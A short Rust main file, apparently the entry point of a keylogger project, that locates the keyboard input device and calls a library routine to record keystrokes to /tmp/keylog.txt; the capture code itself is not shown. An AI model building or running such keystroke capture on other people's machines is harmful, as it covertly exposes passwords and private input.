mod lib;

fn main() {
    let keyboard_device_path = lib::find_keyboard_device();
    let _res = lib::log_keys(keyboard_device_path.unwrap(), String::from("/tmp/keylog.txt"), 3);
}